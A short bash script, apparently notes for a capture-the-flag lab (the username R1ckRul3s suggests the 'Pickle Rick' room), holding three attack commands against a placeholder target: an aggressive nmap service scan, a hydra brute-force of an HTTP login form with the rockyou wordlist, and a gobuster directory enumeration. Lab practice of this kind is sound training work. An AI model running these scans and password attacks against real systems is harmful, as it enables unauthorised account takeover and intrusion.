#!/bin/bash

sudo nmap -sV -A <target_ip_address> -vv

hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt <target_ip_address> http-form-post "/login:username=^USER^&password=^PASS^:Invalid login"

gobuster dir -u http://<target_ip_address>:80/ -x php,html,css,js,txt,pdf -w /usr/share/wordlists/dirb/common.txt 

